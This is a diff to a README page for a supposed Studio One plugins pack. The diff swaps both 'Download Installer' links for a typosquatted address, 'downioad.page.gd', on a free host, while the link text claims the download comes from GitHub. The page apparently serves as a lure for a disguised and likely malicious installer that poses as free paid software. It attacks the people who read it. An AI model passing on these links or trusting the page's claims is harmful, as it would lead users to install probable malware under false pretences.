@@ -2,7 +2,7 @@
 
 This package provides a curated collection of plugins and extensions designed to enhance your Studio One experience on Windows. Perfect for music producers looking to expand their toolkit with professional audio tools, this pack includes a variety of virtual instruments, effects, and utilities optimized for Studio One 2026. Whether you're composing, mixing, or mastering, these tools offer the flexibility and quality needed for professional results.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -85,4 +85,4 @@ This software is provided as-is for educational and personal use. The developers
 
 To get the latest version of the Studio One Pro Plugins Pack, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
